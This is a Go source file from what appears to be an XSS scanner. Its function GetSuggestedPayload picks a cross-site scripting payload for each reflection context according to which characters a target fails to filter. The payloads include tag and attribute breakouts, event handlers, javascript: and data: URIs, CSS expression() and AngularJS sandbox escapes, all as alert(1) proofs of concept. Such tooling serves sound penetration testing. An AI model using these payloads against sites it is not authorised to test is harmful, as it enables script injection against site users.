package reflection

import (
	"github.com/lcalzada-xor/xxss/v2/pkg/models"
)

// GetSuggestedPayload returns a context-specific XSS payload
func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) string {
	// Check which characters are available
	hasLt := contains(unfiltered, "<")
	hasGt := contains(unfiltered, ">")
	hasDquote := contains(unfiltered, "\"")
	hasSquote := contains(unfiltered, "'")
	hasQuote := hasDquote || hasSquote
	hasSpace := contains(unfiltered, " ")
	hasEquals := contains(unfiltered, "=")
	hasSlash := contains(unfiltered, "/")
	hasParen := contains(unfiltered, "(") && contains(unfiltered, ")")

	switch context {
	case models.ContextHTML:
		if hasLt && hasGt {
			if hasSpace && hasEquals {
				// XSS without quotes
				return "<img src=x onerror=alert(1)>"
			}
			if hasSlash {
				return "<script>alert(1)</script>"
			}
			return "<svg onload=alert(1)>"
		}

	case models.ContextJSSingleQuote:
		if hasSquote {
			return "';alert(1);//"
		}
		// Fallback if single quote is filtered but we are in single quote context (hard to exploit)

	case models.ContextJSDoubleQuote:
		if hasDquote {
			return "\";alert(1);//"
		}

	case models.ContextJSRaw:
		if hasParen {
			return ";alert(1);//"
		}
		return "alert(1)"

	case models.ContextJavaScript: // Deprecated fallback
		if hasSquote {
			return "';alert(1);//"
		}
		if hasDquote {
			return "\";alert(1);//"
		}
		if hasParen {
			return ";alert(1);//"
		}

	case models.ContextAttribute:
		// Priority 1: If we have < and >, break out of tag completely
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Priority 2: If we have quotes and space, use event handler
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onmouseover=" + quote + "alert(1)"
		}

	case models.ContextCSS:
		if hasParen {
			return "expression(alert(1))"
		}
		return "x:expression(alert(1))"

	case models.ContextTemplateLiteral:
		// Break out of template literal
		if contains(unfiltered, "$") && contains(unfiltered, "{") && contains(unfiltered, "}") {
			return "${alert(1)}"
		}
		if contains(unfiltered, "`") {
			return "`+alert(1)+`"
		}
		return "';alert(1);//"

	case models.ContextSVG:
		// SVG-specific XSS
		if hasLt && hasGt {
			return "<set attributeName=onmouseover value=alert(1)>"
		}
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onload=" + quote + "alert(1)"
		}
		return "<animate onbegin=alert(1)>"

	case models.ContextMetaRefresh:
		// Meta refresh URL injection
		return "javascript:alert(1)"

	case models.ContextDataURI:
		// Data URI XSS
		return "data:text/html,<script>alert(1)</script>"

	case models.ContextComment:
		if hasGt && hasLt {
			return "--><script>alert(1)</script><!--"
		}

	case models.ContextAngular:
		// AngularJS sandbox escape payloads
		hasDot := contains(unfiltered, ".")
		hasBracket := contains(unfiltered, "[") && contains(unfiltered, "]")

		if hasParen && hasDot {
			// Constructor-based escape (most reliable)
			return "{{constructor.constructor('alert(1)')()}}"
		}
		if hasBracket && hasParen && hasDot {
			// Array-based escape
			return "{{[].pop.constructor('alert(1)')()}}"
		}
		if hasDot {
			// $on-based escape (older Angular versions)
			return "{{$on.constructor('alert(1)')()}}"
		}
		// Fallback - simple expression
		return "{{alert(1)}}"

	case models.ContextURL:
		// Priority 1: Break out of tag (same as Attribute)
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Priority 2: Javascript protocol
		return "javascript:alert(1)"

	case models.ContextTagName:
		if hasGt && hasSpace && hasEquals {
			return " onload=alert(1)>"
		}
		if hasGt && hasLt {
			return "><script>alert(1)</script>"
		}

	case models.ContextRCDATA:
		if hasLt && hasGt && hasSlash {
			return "</title><script>alert(1)</script>" // Works for textarea too as generic closer
		}
	}

	return ""
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
